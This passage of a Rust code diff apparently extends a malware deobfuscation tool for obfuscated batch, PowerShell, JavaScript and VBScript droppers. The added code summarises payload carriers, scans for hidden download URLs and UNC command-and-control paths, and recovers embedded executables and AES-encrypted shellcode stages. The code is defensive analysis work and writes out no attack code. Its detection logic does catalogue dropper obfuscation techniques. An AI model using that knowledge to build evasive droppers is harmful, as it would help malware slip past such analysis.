+                .map(|text| text.as_bytes())
+                .or_else(|| {
+                    summarized_tail_reversed_gzip_pe
+                        .as_ref()
+                        .map(|text| text.as_bytes())
+                })
+                .or_else(|| {
+                    summarized_raw_alpha_echo
+                        .as_ref()
+                        .map(|text| text.as_bytes())
+                })
+                .or_else(|| {
+                    summarized_tail_spaced_ps1
+                        .as_ref()
+                        .map(|text| text.as_bytes())
+                })
+                .or_else(|| {
+                    summarized_tail_base64_ps1
+                        .as_ref()
+                        .map(|text| text.as_bytes())
+                })
+                .or_else(|| {
+                    summarized_self_tail_base64
+                        .as_ref()
+                        .map(|text| text.as_bytes())
+                })
+                .or_else(|| {
+                    summarized_raw_encoded_set_carriers
+                        .as_ref()
+                        .map(|text| text.as_bytes())
+                })
+                .or_else(|| {
+                    summarized_echo_base64_pe
+                        .as_ref()
+                        .map(|text| text.as_bytes())
+                })
+                .or_else(|| {
+                    summarized_raw_colon_comment
+                        .as_ref()
+                        .map(|text| text.as_bytes())
+                })
+                .or_else(|| {
+                    summarized_raw_base64_pe
+                        .as_ref()
+                        .map(|text| text.as_bytes())
+                })
+                .or_else(|| {
+                    summarized_raw_opaque_base64
+                        .as_ref()
+                        .map(|text| text.as_bytes())
+                })
+                .or_else(|| {
+                    summarized_raw_binary_noise
+                        .as_ref()
+                        .map(|text| text.as_bytes())
+                })
+                .or_else(|| {
+                    summarized_repetitive_rem_noise
+                        .as_ref()
+                        .map(|text| text.as_bytes())
+                })
+                .or_else(|| summarized_raw_long_rem.as_ref().map(|text| text.as_bytes()))
+                .or_else(|| {
+                    summarized_raw_percent_noise
+                        .as_ref()
+                        .map(|text| text.as_bytes())
+                })
+                .or_else(|| summarized_pem_pe.as_ref().map(|text| text.as_bytes()))
+                .unwrap_or(raw_scan_input),
+            &mut env,
+            &mut out,
+        );
+    }
+    if let Some(padding_len) = inert_nul_padding_suffix_len {
+        if !out.is_empty() && !out.ends_with('\n') {
+            out.push_str("\r\n");
+        }
+        render_inert_nul_padding_summary(padding_len, &mut env, &mut out);
+        out.push_str("\r\n");
+    }
+    for summarized in [
+        summarized_pem_pe.as_ref(),
+        summarized_tail_reversed_gzip_pe.as_ref(),
+        summarized_raw_alpha_echo.as_ref(),
+        summarized_tail_spaced_ps1.as_ref(),
+        summarized_tail_base64_ps1.as_ref(),
+        summarized_self_tail_base64.as_ref(),
+        summarized_raw_encoded_set_carriers.as_ref(),
+        summarized_echo_base64_pe.as_ref(),
+        summarized_raw_colon_comment.as_ref(),
+        summarized_raw_scan_text.as_ref(),
+        summarized_raw_base64_pe.as_ref(),
+        summarized_raw_opaque_base64.as_ref(),
+        summarized_raw_binary_noise.as_ref(),
+        summarized_repetitive_rem_noise.as_ref(),
+        summarized_raw_long_rem.as_ref(),
+        summarized_raw_percent_noise.as_ref(),
+    ]
+    .into_iter()
+    .flatten()
+    {
+        append_unrendered_omission_summaries(summarized, &mut out);
+    }
+    if let Some(summarized) = summarize_large_pem_payload_blocks(&out, &mut env) {
+        out = summarized;
+    }
+    if let Some(summarized) = summarize_repetitive_rem_noise_runs(&out, &mut env) {
+        out = summarized;
+    }
+    out = summarize_long_rem_comment_lines(&out, &mut env);
+    if let Some(summarized) = coalesce_long_rem_comment_summary_lines(&out, &mut env) {
+        out = summarized;
+    }
+    out = summarize_repeated_colon_marker_lines(&out, &mut env);
+    if let Some(cleaned) = strip_repeated_vbs_msgbox_noop_fragments(&out, &mut env) {
+        out = cleaned;
+    }
+    if let Some(summarized) = summarize_long_alpha_echo_lines(&out, &mut env) {
+        out = summarized;
+    }
+    if let Some(summarized) = summarize_c_style_junkcode_echo_runs(&out, &mut env) {
+        out = summarized;
+    }
+    if let Some(summarized) = summarize_blank_echo_spacer_runs(&out, &mut env) {
+        out = summarized;
+    }
+    out = summarize_binary_noise_line_runs(&out, &mut env);
+    if let Some(summarized) = coalesce_binary_noise_summary_lines(&out, &mut env) {
+        out = summarized;
+    }
+    out = summarize_one_line_hex_pe_carriers(out, &mut env);
+    if let Some(summarized) =
+        summarize_echo_base64_redirect_runs_after_materialization(&out, &mut env)
+    {
+        out = summarized;
+    }
+    out = summarize_generated_nonascii_set_scaffold_runs(&out, &mut env);
+    out = summarize_repetitive_admin_cleanup_lines(&out, &mut env);
+    if let Some(summarized) = summarize_grouped_echo_decodehex_carriers(&out, &mut env) {
+        out = summarized;
+    }
+    out = coalesce_repeated_output_lines(&out, &mut env);
+    out = coalesce_adjacent_idempotent_command_duplicates(&out);
+    out = summarize_spaced_hex_blob_lines(&out, &mut env);
+    out = coalesce_cmd_echo_powershell_wrapper_lines(&out, &mut env);
+    out = summarize_long_unresolved_percent_noise_lines(&out, &mut env);
+    if let Some(summarized) = coalesce_long_unresolved_percent_noise_summary_lines(&out, &mut env) {
+        out = summarized;
+    }
+    if let Some(summarized) = summarize_quoted_base64_fragment_line_runs(&out) {
+        out = summarized;
+    }
+    out = summarize_dense_unresolved_substring_fragment_lines(&out, &mut env);
+    if let Some(summarized) = summarize_dense_plain_word_salad_lines(&out, &mut env) {
+        out = summarized;
+    }
+    if let Some(summarized) = summarize_dense_unknown_bare_command_noise_lines(&out, &mut env) {
+        out = summarized;
+    }
+    if let Some(summarized) = summarize_dense_unresolved_control_flow_noise_lines(&out, &mut env) {
+        out = summarized;
+    }
+    if let Some(cleaned) = strip_unicode_marker_noise_lines(&out) {
+        out = cleaned;
+    }
+    if let Some(rendered) = render_decoded_powershell_encoded_commands(&out, &env) {
+        out = rendered;
+    }
+    if let Some(summarized) = summarize_powershell_frombase64_command_lines(&out, &mut env) {
+        out = summarized;
+    }
+    if let Some(summarized) = summarize_powershell_scriptparts_base64_carrier(&out, &mut env) {
+        out = summarized;
+    }
+    if !raw_scan_text_has_large_carrier_summary
+        && should_scan_raw_embedded_powershell(raw_scan_text_for_analysis, &out)
+    {
+        deob_scan::scan_embedded_powershell_invocations(raw_scan_text_for_analysis, &mut env);
+    }
+    deob_scan::scan_embedded_powershell_invocations(&out, &mut env);
+    deob_scan::scan_copied_powershell_invocations(&out, &mut env);
+    env.all_extracted_ps1
+        .extend(std::mem::take(&mut env.exec_ps1));
+    analyze_extracted_payloads(&mut env, 1);
+    if let Some(summarized) = summarize_repeated_windows_profile_check_blocks(&out, &mut env) {
+        out = summarized;
+    }
+    ps1_scan::extract_self_embedded_ps1(&mut env, &out);
+    ps1_scan::scan_ps1_payloads(&mut env);
+    let mut aes_scanned_out_key: Option<u64> = None;
+    let skip_raw_aes_chain = skip_large_raw_self_read_aes_chain(raw_scan_input, &out);
+    if !env.check_timeout() {
+        deob_scan::scan_multistage_encrypted_dropper(&out, &mut env);
+        if !skip_raw_aes_chain && should_run_aes_chain(raw_scan_text_for_analysis, &out, &env) {
+            aes_scanned_out_key = Some(aes_scan_key(&out));
+            aes_chain::extract_from_chain(raw_scan_input, &out, &mut env);
+        }
+    }
+    if !env.check_timeout() {
         out = summarize_self_tail_base64_payloads(&out, &mut env);
         out = summarize_encoded_set_carrier_line_runs(&out, &mut env);
+        out = summarize_conditional_numeric_set_staging_runs(&out, &mut env);
+        out = summarize_numeric_label_dispatch_scaffolding(&out, &mut env);
+        out = suppress_short_set_fragment_line_runs(&out, &mut env);
+        out = suppress_unreferenced_extracted_short_set_fragments(&out, &env);
+        out = summarize_unreferenced_long_set_scaffolding_runs(&out, &mut env);
+        if let Some(summarized) =
+            summarize_dense_unresolved_control_flow_noise_lines(&out, &mut env)
+        {
+            out = summarized;
+        }
+        out = suppress_dense_extracted_script_set_fragment_lines(&out, &mut env);
+        out = summarize_redundant_long_script_set_value_lines(&out, &mut env);
+        if let Some(summarized) = suppress_recovered_dropper_set_carrier_lines(&out, &mut env) {
+            out = summarized;
+        }
+        pre_scan_batch_js_comment_polyglot(&out, &mut env);
+        pre_scan_polyglot_script_block(out.as_bytes(), &mut env);
+        let ps1_count_before_script_payload_scans = env.all_extracted_ps1.len();
         vbs_scan::scan_vbs_payloads(&mut env);
         js_scan::scan_js_payloads(&mut env);
+        if env.all_extracted_ps1.len() > ps1_count_before_script_payload_scans {
+            ps1_scan::scan_ps1_payloads(&mut env);
+        }
         ps1_scan::scan_inline_powershell_text(&out, &mut env);
-        deob_scan::scan_rot13_url_prefix(&out, &mut env);
-        deob_scan::scan_deob_text(&out, &mut env);
-        deob_scan::scan_raw_curl_known_percent_urls(&raw_text, &mut env);
-        // The char-index-extractor scan needs the FULL source — our
-        // normalize pipeline's marker-noise stripping can mangle the
-        // PS body that hosts the `function Musculos…` definition
-        // (订单列表.bat is 4 KB on one line but the deob is ~2 KB with
-        // the body split). Run it again over the raw input so the
-        // call sites are intact.
-        deob_scan::scan_ps_char_index_extractor_urls(&raw_text, &mut env);
-        // .js samples that wrap their HTA/JS payload in
-        // `unescape('%XX%XX…')` (8 corpus samples, gov-cn.cloud
-        // family) get the URLs hidden inside URL-encoded blobs. The
-        // call from `scan_deob_text(&out)` only sees the post-drive()
-        // output; for .js files most of the original `unescape(...)`
-        // calls only exist in `raw_text`. Run it there too.
-        deob_scan::scan_js_unescape_urls(&raw_text, &mut env);
+    }
+    if !env.check_timeout() {
+        if !should_skip_final_deob_text_scan(&out) {
+            deob_scan::scan_rot13_url_prefix(&out, &mut env);
+            if raw_scan_text_has_large_carrier_summary && env.limits.deadline.is_some() {
+                deob_scan::scan_deob_text_shallow(&out, &mut env);
+            } else {
+                deob_scan::scan_deob_text(&out, &mut env);
+            }
+        }
+        if !raw_scan_text_has_large_carrier_summary
+            && raw_scan_text_for_analysis.len() <= RAW_EMBEDDED_POWERSHELL_SCAN_MAX_BYTES
+        {
+            deob_scan::scan_raw_curl_known_percent_urls(raw_scan_text_for_analysis, &mut env);
+        }
+    }
+    // The char-index-extractor scan needs the FULL source — our
+    // normalize pipeline's marker-noise stripping can mangle the
+    // PS body that hosts the `function Musculos…` definition
+    // (订单列表.bat is 4 KB on one line but the deob is ~2 KB with
+    // the body split). Run it again over the raw input so the
+    // call sites are intact.
+    if !env.check_timeout()
+        && !raw_scan_text_has_large_carrier_summary
+        && raw_scan_text_for_analysis.len() <= RAW_EMBEDDED_POWERSHELL_SCAN_MAX_BYTES
+    {
+        deob_scan::scan_ps_char_index_extractor_urls(raw_scan_text_for_analysis, &mut env);
+    }
+    // .js samples that wrap their HTA/JS payload in
+    // `unescape('%XX%XX…')` (8 corpus samples, gov-cn.cloud
+    // family) get the URLs hidden inside URL-encoded blobs. The
+    // call from `scan_deob_text(&out)` only sees the post-drive()
+    // output; for .js files most of the original `unescape(...)`
+    // calls only exist in `raw_text`. Run it there too.
+    if !env.check_timeout()
+        && !raw_scan_text_has_large_carrier_summary
+        && raw_scan_text_for_analysis.len() <= RAW_EMBEDDED_POWERSHELL_SCAN_MAX_BYTES
+    {
+        deob_scan::scan_js_unescape_urls(raw_scan_text_for_analysis, &mut env);
+    }
+    if !env.check_timeout() {
         deob_scan::scan_inline_b64_urls(&out, &mut env);
         deob_scan::scan_bare_b64_urls(&out, &mut env);
         deob_scan::scan_b64_url_prefix(&out, &mut env);
@@ -8493,7 +10861,14 @@ fn analyze_inner(
         deob_scan::scan_bare_ip_urls(&out, &mut env);
         deob_scan::scan_decimal_ip_urls(&out, &mut env);
         deob_scan::scan_multistage_encrypted_dropper(&out, &mut env);
-        aes_chain::extract_from_chain(input, &out, &mut env);
+        if !skip_raw_aes_chain {
+            let out_key = aes_scan_key(&out);
+            if aes_scanned_out_key != Some(out_key)
+                && should_run_aes_chain(raw_scan_text_for_analysis, &out, &env)
+            {
+                aes_chain::extract_from_chain(raw_scan_input, &out, &mut env);
+            }
+        }
         deob_scan::scan_unc_webdav(&out, &mut env);
     }
     // Also walk JS/VBS payloads for UNC C2 patterns — the deob text only
@@ -8502,6 +10877,16 @@ fn analyze_inner(
     // scan the raw payload bodies directly.
     let jscript_bodies: Vec<Vec<u8>> = env.all_extracted_jscript.clone();
     let vbs_bodies: Vec<Vec<u8>> = env.all_extracted_vbs.clone();
+    extract_cmd_echo_powershell_pipeline_payloads_from_deob(&out, &mut env);
+    let cmd_bodies_for_aes: Vec<String> = env.all_extracted_cmd.clone();
+    for cmd in &cmd_bodies_for_aes {
+        if env.check_timeout() {
+            break;
+        }
+        if text_has_aes_chain_hint(cmd) {
+            aes_chain::extract_from_chain(raw_scan_input, cmd, &mut env);
+        }
+    }
     let ps1_bodies: Vec<Vec<u8>> = env.all_extracted_ps1.clone();
     for body in jscript_bodies
         .iter()
@@ -8529,22 +10914,56 @@ fn analyze_inner(
         _ => true,
     });
     dedup_traits(&mut env.traits, cfg.max_traits_per_kind);
-    let extracted_ps1_normalized: Vec<String> = env
-        .all_extracted_ps1
-        .iter()
-        .map(|bytes| ps1_scan::normalize_ps1_payload(bytes))
-        .collect();
+    reconcile_live_trait_caps(
+        &mut env.traits,
+        env.admin_command_total,
+        cfg.max_traits_per_kind,
+    );
+    let extracted_ps1_for_deflate_assembly = env.all_extracted_ps1.clone();
+    for bytes in &extracted_ps1_for_deflate_assembly {
+        if env.check_timeout() {
+            break;
+        }
+        let text = decode_likely_powershell_payload(bytes);
+        for pe in ps1_scan::recover_deflate_xor_base64_assembly_payloads(&text, env.limits.deadline)
+        {
+            push_recovered_pe_artifact(&mut env, "ps1-deflate-xor-base64-assembly", pe);
+        }
+    }
+    let mut extracted_ps1_normalized: Vec<String> = Vec::with_capacity(env.all_extracted_ps1.len());
+    let ps1_payloads_for_normalization = env.all_extracted_ps1.clone();
+    for bytes in &ps1_payloads_for_normalization {
+        if env.check_timeout() {
+            break;
+        }
+        let (normalized, timed_out) =
+            ps1_scan::normalize_ps1_payload_for_report_until(bytes, env.limits.deadline);
+        extracted_ps1_normalized.push(normalized);
+        if timed_out {
+            env.note_timeout();
+            break;
+        }
+    }
     let extracted_ps1_for_aes: Vec<String> = env
         .all_extracted_ps1
         .iter()
-        .map(|bytes| decode_likely_powershell_payload(bytes))
+        .map(|bytes| {
+            let decoded = decode_likely_powershell_payload(bytes);
+            ps1_scan::expand_ps_env_refs(&decoded, &env)
+        })
         .collect();
+    if !env.check_timeout() {
+        collect_ps1_aes_shellcode_artifacts(&extracted_ps1_for_aes, &mut env);
+    }
     let redundant_extracted_ps1_aes = redundant_extracted_ps1_aes_payloads(
         &extracted_ps1_for_aes,
         &extracted_ps1_normalized,
         &out,
     );
     for (idx, ps) in extracted_ps1_for_aes.iter().enumerate() {
+        if env.check_timeout() {
+            break;
+        }
         if redundant_extracted_ps1_aes
             .get(idx)
             .copied()
@@ -8552,24 +10971,31 @@ fn analyze_inner(
         {
             continue;
         }
-        aes_chain::extract_from_chain(input, ps, &mut env);
+        if !should_run_aes_chain(raw_scan_text_for_analysis, ps, &env) {
+            continue;
+        }
+        aes_chain::extract_from_chain(raw_scan_input, ps, &mut env);
     }
-    for (idx, ps) in extracted_ps1_normalized.iter().enumerate() {
-        if redundant_extracted_ps1_aes
-            .get(idx)
-            .copied()
-            .unwrap_or(false)
-            || extracted_ps1_aes_payload_is_redundant(ps, ps, &out)
-        {
+    for ps in &extracted_ps1_normalized {
+        if env.check_timeout() {
+            break;
+        }
+        if extracted_ps1_aes_payload_is_redundant(ps, ps, &out) {
             continue;
         }
-        aes_chain::extract_from_chain(input, ps, &mut env);
+        if !should_run_aes_chain(raw_scan_text_for_analysis, ps, &env) {
+            continue;
+        }
+        aes_chain::extract_from_chain(raw_scan_input, ps, &mut env);
     }
     // Keep extracted layers out of the main deobfuscated batch buffer, but
     // still scan their normalized text directly for IOCs that are only visible
     // after peeling the layer.
     let mut scanned_ps_keys: std::collections::HashSet<String> = std::collections::HashSet::new();
     for ps in &extracted_ps1_normalized {
+        if env.check_timeout() {
+            break;
+        }
         let trimmed = ps.trim();
         if trimmed.is_empty() {
             continue;
@@ -8581,22 +11007,139 @@ fn analyze_inner(
         if first_line.is_empty() || !scanned_ps_keys.insert(first_line) {
             continue;
         }
-        deob_scan::scan_deob_text(trimmed, &mut env);
+        deob_scan::scan_extracted_script_text(trimmed, &mut env);
     }
-    collect_ps1_self_tail_reversed_gzip_pe(input, &extracted_ps1_normalized, &mut env);
-    deob_scan::scan_deob_text(&out, &mut env);
+    if !env.check_timeout() {
+        collect_ps1_self_tail_reversed_gzip_pe(raw_scan_input, &extracted_ps1_normalized, &mut env);
+    }
+    out = summarize_long_powershell_staging_set_lines(&out, &mut env);
+    out = summarize_conditional_numeric_set_staging_runs(&out, &mut env);
+    out = summarize_numeric_label_dispatch_scaffolding(&out, &mut env);
+    if let Some(summarized) = coalesce_long_unresolved_percent_noise_summary_lines(&out, &mut env) {
+        out = summarized;
+    }
+    if let Some(summarized) = summarize_dense_plain_word_salad_lines(&out, &mut env) {
+        out = summarized;
+    }
+    if let Some(summarized) = summarize_dense_unknown_bare_command_noise_lines(&out, &mut env) {
+        out = summarized;
+    }
+    if let Some(summarized) = summarize_dense_unresolved_control_flow_noise_lines(&out, &mut env) {
+        out = summarized;
+    }
+    if let Some(summarized) = coalesce_binary_noise_summary_lines(&out, &mut env) {
+        out = summarized;
+    }
+    if !env.check_timeout() {
+        if raw_scan_text_has_large_carrier_summary && env.limits.deadline.is_some() {
+            deob_scan::scan_deob_text_shallow(&out, &mut env);
+        } else {
+            deob_scan::scan_deob_text(&out, &mut env);
+        }
+    }
     // Re-run dedup since direct extracted-layer scans may have emitted dupes.
     let max_per_kind = cfg.max_traits_per_kind;
     dedup_traits(&mut env.traits, max_per_kind);
-    collect_decoded_pe_artifacts(&mut env);
-    let raw_input_text = String::from_utf8_lossy(input);
-    if has_embedded_base64_pe_carrier_hint(input) {
-        collect_embedded_base64_pe_carrier_artifacts(&raw_input_text, &mut env);
+    reconcile_live_trait_caps(&mut env.traits, env.admin_command_total, max_per_kind);
+    if !env.check_timeout() {
+        collect_decoded_pe_artifacts(&mut env);
     }
-    out = summarize_multiline_base64_pe_carrier_blocks(out, &mut env);
-    scan_recovered_artifact_strings(&mut env);
+    if !env.check_timeout() {
+        collect_ps1_aes_shellcode_artifacts(&extracted_ps1_normalized, &mut env);
+    }
+    let raw_input_text;
+    let raw_input_scan_text =
+        if summarized_raw_opaque_base64.is_some() || summarized_raw_percent_noise.is_some() {
+            raw_scan_text_for_analysis
+        } else {
+            raw_input_text = String::from_utf8_lossy(input);
+            trim_inert_nul_padding_suffix_text(&raw_input_text)
+        };
+    if !env.check_timeout() && has_embedded_base64_pe_carrier_hint(raw_scan_input) {
+        collect_embedded_base64_pe_carrier_artifacts(raw_input_scan_text, &mut env);
+    }
+    if !env.check_timeout() {
+        out = summarize_multiline_base64_pe_carrier_blocks(out, &mut env);
+    }
+    out = summarize_encoded_set_carrier_line_runs(&out, &mut env);
+    out = suppress_short_set_fragment_line_runs(&out, &mut env);
+    out = suppress_unreferenced_extracted_short_set_fragments(&out, &env);
+    out = summarize_unreferenced_long_set_scaffolding_runs(&out, &mut env);
+    out = summarize_generated_nonascii_set_scaffold_runs(&out, &mut env);
+    if let Some(summarized) = summarize_dense_unresolved_control_flow_noise_lines(&out, &mut env) {
+        out = summarized;
+    }
+    out = suppress_dense_extracted_script_set_fragment_lines(&out, &mut env);
+    out = summarize_redundant_long_script_set_value_lines(&out, &mut env);
+    if let Some(summarized) = suppress_recovered_dropper_set_carrier_lines(&out, &mut env) {
+        out = summarized;
+    }
+    out = strip_embedded_csharp_batch_string_wrappers(&out);
+    out = summarize_embedded_csharp_residual_data_rows(&out, &mut env);
+    out = coalesce_repeated_output_lines(&out, &mut env);
+    out = coalesce_adjacent_idempotent_command_duplicates(&out);
+    out = coalesce_cmd_echo_powershell_wrapper_lines(&out, &mut env);
+    out = coalesce_repeated_unicode_marker_set_lines(&out, &mut env);
+    if let Some(summarized) = summarize_repeated_windows_profile_check_blocks(&out, &mut env) {
+        out = summarized;
+    }
+    out = summarize_long_unresolved_percent_noise_lines(&out, &mut env);
+    if let Some(summarized) = coalesce_long_unresolved_percent_noise_summary_lines(&out, &mut env) {
+        out = summarized;
+    }
+    out = summarize_long_cmd_echo_powershell_pipeline_lines(&out, &mut env);
+    out = summarize_dense_unresolved_substring_fragment_lines(&out, &mut env);
+    if let Some(summarized) = summarize_abobus_obfuscator_scaffold_lines(&out, &mut env) {
+        out = summarized;
+    }
+    out = summarize_long_powershell_marker_base64_lines(&out, &mut env);
+    out = summarize_residual_opaque_base64_carrier_lines(&out, &mut env);
+    out = split_long_compound_command_chain_lines(&out);
+    out = summarize_empty_powershell_file_argument_preview_lines(&out, &mut env);
+    out = summarize_long_inline_powershell_command_lines(&out, &mut env);
+    out = summarize_long_powershell_staging_set_lines(&out, &mut env);
+    out = summarize_conditional_numeric_set_staging_runs(&out, &mut env);
+    out = summarize_long_attrib_ads_lines(&out, &mut env);
+    out = summarize_repeated_colon_marker_lines(&out, &mut env);
+    if let Some(cleaned) = strip_repeated_vbs_msgbox_noop_fragments(&out, &mut env) {
+        out = cleaned;
+    }
+    out = summarize_binary_noise_line_runs(&out, &mut env);
+    if let Some(summarized) = suppress_residual_binary_noise_lines(&out, &mut env) {
+        out = summarized;
+    }
+    if let Some(summarized) = suppress_dense_rendered_residual_binary_noise_lines(&out, &mut env) {
+        out = summarized;
+    }
+    if let Some(summarized) = summarize_pem_pe_payload(&out, &mut env) {
+        out = summarized;
+    }
+    if let Some(summarized) = summarize_large_pem_payload_blocks(&out, &mut env) {
+        out = summarized;
+    }
+    if let Some(summarized) = replace_large_pem_blocks_with_existing_summary(&out) {
+        out = summarized;
+    }
+    if let Some(summarized) = summarize_vbs_base64_string_carriers(&out, &mut env) {
+        out = summarized;
+    }
+    if let Some(summarized) = summarize_large_vbs_utility_carrier(&out, &mut env) {
+        out = summarized;
+    }
+    if let Some(summarized) =
+        summarize_echo_base64_redirect_runs_after_materialization(&out, &mut env)
+    {
+        out = summarized;
+    }
+    out = split_long_compound_command_chain_lines(&out);
+    out = summarize_empty_powershell_file_argument_preview_lines(&out, &mut env);
+    if !env.check_timeout() {
+        scan_recovered_artifact_strings(&mut env);
+    }
+    deob_scan::resolve_self_elevation_args_from_batch_assignments(raw_input_scan_text, &mut env);
     correlate_startup_folder_downloads(&mut env.traits);
     dedup_traits(&mut env.traits, max_per_kind);
+    reconcile_live_trait_caps(&mut env.traits, env.admin_command_total, max_per_kind);
     Report {
         deobfuscated: out,
         traits: std::mem::take(&mut env.traits),
@@ -8607,6 +11150,162 @@ fn analyze_inner(
         extracted_vbs: std::mem::take(&mut env.all_extracted_vbs),
         recovered_pe: std::mem::take(&mut env.recovered_pe),
     }
+}
+
+fn disguised_binary_report(
+    input: &[u8],
+    mut env: Environment,
+    format: &str,
+    artifact_label: &str,
+    max_traits_per_kind: u32,
+) -> Report {
+    env.traits.push(Trait::DisguisedBinary {
+        format: format.to_string(),
+        size: input.len() as u64,
+    });
+    env.recovered_pe
+        .push((artifact_label.to_string(), input.to_vec()));
+    scan_binary_input_urls(input, &mut env);
+    dedup_traits(&mut env.traits, max_traits_per_kind);
+
+    Report {
+        deobfuscated: String::new(),
+        traits: std::mem::take(&mut env.traits),
+        extracted_cmd: Vec::new(),
+        extracted_ps1: Vec::new(),
+        extracted_ps1_normalized: Vec::new(),
+        extracted_jscript: Vec::new(),
+        extracted_vbs: Vec::new(),
+        recovered_pe: std::mem::take(&mut env.recovered_pe),
+    }
+}
+
+struct GithubBlobHtml {
+    path: Option<String>,
+    raw_url: Option<String>,
+    content: String,
+}
+
+struct GithubLargeBlobHtml {
+    path: Option<String>,
+    raw_url: Option<String>,
+}
+
+fn extract_github_blob_raw_lines(input: &[u8]) -> Option<GithubBlobHtml> {
+    let text = std::str::from_utf8(input).ok()?;
+    let trimmed = text.trim_start();
+    if !trimmed.starts_with("<!DOCTYPE html")
+        && !trimmed.starts_with("<html")
+        && !trimmed.starts_with("<HTML")
+    {
+        return None;
+    }
+    if !text.contains("react-app.embeddedData") || !text.contains("\"rawLines\"") {
+        return None;
+    }
+
+    let marker = "react-app.embeddedData";
+    let marker_pos = text.find(marker)?;
+    let script_start = text[..marker_pos].rfind("<script")?;
+    let json_start = text[marker_pos..]
+        .find('>')
+        .map(|idx| marker_pos + idx + 1)?;
+    let json_end = text[json_start..]
+        .find("</script>")
+        .map(|idx| json_start + idx)?;
+    if script_start >= json_start || json_start >= json_end {
+        return None;
+    }
+
+    let value: serde_json::Value = serde_json::from_str(text[json_start..json_end].trim()).ok()?;
+    let raw_lines = value.pointer("/payload/blob/rawLines")?.as_array()?;
+    if raw_lines.is_empty() {
+        return None;
+    }
+
+    let mut content = String::new();
+    for (idx, line) in raw_lines
+        .iter()
+        .filter_map(|line| line.as_str())
+        .enumerate()
+    {
+        if idx > 0 {
+            content.push_str("\r\n");
+        }
+        content.push_str(line);
+    }
+    if content.trim().is_empty() {
+        return None;
+    }
+
+    let path = value
+        .pointer("/payload/path")
+        .and_then(|v| v.as_str())
+        .map(str::to_string);
+    let raw_url = value
+        .pointer("/payload/blob/rawBlobUrl")
+        .and_then(|v| v.as_str())
+        .map(str::to_string);
+
+    Some(GithubBlobHtml {
+        path,
+        raw_url,
+        content,
+    })
+}
+
+fn extract_github_large_blob_placeholder(input: &[u8]) -> Option<GithubLargeBlobHtml> {
+    let text = std::str::from_utf8(input).ok()?;
+    let trimmed = text.trim_start();
+    if !trimmed.starts_with("<!DOCTYPE html")
+        && !trimmed.starts_with("<html")
+        && !trimmed.starts_with("<HTML")
+    {
+        return None;
+    }
+    if !text.contains("react-app.embeddedData") || !text.contains("\"rawBlobUrl\"") {
+        return None;
+    }
+
+    let marker = "react-app.embeddedData";
+    let marker_pos = text.find(marker)?;
+    let json_start = text[marker_pos..]
+        .find('>')
+        .map(|idx| marker_pos + idx + 1)?;
+    let json_end = text[json_start..]
+        .find("</script>")
+        .map(|idx| json_start + idx)?;
+    if json_start >= json_end {
+        return None;
+    }
+
+    let value: serde_json::Value = serde_json::from_str(text[json_start..json_end].trim()).ok()?;
+    let blob = value.pointer("/payload/blob")?;
+    if blob
+        .get("rawLines")
+        .is_some_and(|raw_lines| raw_lines.is_array())
+    {
+        return None;
+    }
+    let large = blob.get("large").and_then(|v| v.as_bool()).unwrap_or(false)
+        || blob
+            .pointer("/headerInfo/blobSize")
+            .and_then(|v| v.as_str())
+            .is_some();
+    let raw_url = blob
+        .get("rawBlobUrl")
+        .and_then(|v| v.as_str())
+        .map(str::to_string);
+    if !large || raw_url.is_none() {
+        return None;
+    }
+    let path = value
+        .pointer("/payload/path")
+        .or_else(|| blob.get("displayName"))
+        .and_then(|v| v.as_str())
+        .map(str::to_string);
+
+    Some(GithubLargeBlobHtml { path, raw_url })
 }
 
 fn looks_like_extracted_powershell(trimmed: &str) -> bool {
@@ -8638,6 +11337,68 @@ fn summarize_multiline_base64_pe_carrier_blocks(text: String, env: &mut Environm
     }
 }
 
+fn summarize_one_line_hex_pe_carriers(text: String, env: &mut Environment) -> String {
+    let mut changed = false;
+    let mut out = String::with_capacity(text.len().min(512 * 1024));
+
+    for line in text.lines() {
+        if let Some(pe) = decode_one_line_hex_pe_carrier(line) {
+            push_recovered_pe_artifact(env, "embedded-hex-pe", pe.clone());
+            env.traits.push(crate::traits::Trait::LineTruncated {
+                original_len: line.len() as u64,
+            });
+            out.push_str(&format!(
+                ":: omitted one-line hex PE carrier ({} hex text bytes, {} decoded bytes)\r\n",
+                line.len(),
+                pe.len()
+            ));
+            changed = true;
+        } else {
+            out.push_str(line);
+            out.push_str("\r\n");
+        }
+    }
+
+    if changed {
+        out
+    } else {
+        text
+    }
+}
+
+fn decode_one_line_hex_pe_carrier(line: &str) -> Option<Vec<u8>> {
+    let trimmed = line.trim();
+    if trimmed.len() < 4096 {
+        return None;
+    }
+    if !trimmed
+        .get(..5)
+        .is_some_and(|head| head.eq_ignore_ascii_case("4d 5a"))
+        && !trimmed
+            .get(..4)
+            .is_some_and(|head| head.eq_ignore_ascii_case("4d5a"))
+    {
+        return None;
+    }
+    if !trimmed
+        .bytes()
+        .all(|b| b.is_ascii_hexdigit() || b.is_ascii_whitespace())
+    {
+        return None;
+    }
+
+    let hex_text: String = trimmed
+        .bytes()
+        .filter(|b| b.is_ascii_hexdigit())
+        .map(char::from)
+        .collect();
+    if hex_text.len() > 16 * 1024 * 1024 || hex_text.len() % 2 != 0 {
+        return None;
+    }
+    let pe = hex::decode(hex_text).ok()?;
+    pe.starts_with(b"MZ").then_some(pe)
+}
+
 fn flush_base64_pe_block(out: &mut String, block: &mut Vec<&str>, env: &mut Environment) -> bool {
     if block.is_empty() {
         return false;
@@ -8660,12 +11421,19 @@ fn flush_base64_pe_block(out: &mut String, block: &mut Vec<&str>, env: &mut Envi
                 if let Some((label_kind, pe)) = decoded {
                     push_recovered_pe_artifact(env, label_kind, pe);
                 }
-                out.push_str(&format!(
-                    "::==== batdeob: omitted multiline base64 PE carrier ({} lines, {} base64 bytes, ~{} decoded bytes) ====\r\n",
-                    block.len(),
-                    total_len,
-                    decoded_estimate
-                ));
+                if block.len() == 1 {
+                    out.push_str(&format!(
+                        "rem omitted base64 PE carrier ({} base64 bytes, ~{} decoded bytes)\r\n",
+                        total_len, decoded_estimate
+                    ));
+                } else {
+                    out.push_str(&format!(
+                        "rem omitted multiline base64 PE carrier ({} lines, {} base64 bytes, ~{} decoded bytes)\r\n",
+                        block.len(),
+                        total_len,
+                        decoded_estimate
+                    ));
+                }
                 block.clear();
                 return true;
             }
@@ -8674,7 +11442,7 @@ fn flush_base64_pe_block(out: &mut String, block: &mut Vec<&str>, env: &mut Envi
                     push_recovered_pe_artifact(env, label_kind, pe);
                 }
                 out.push_str(&format!(
-                    "::==== batdeob: omitted multiline base64-encoded hex PE carrier ({} lines, {} base64 bytes, ~{} hex bytes) ====\r\n",
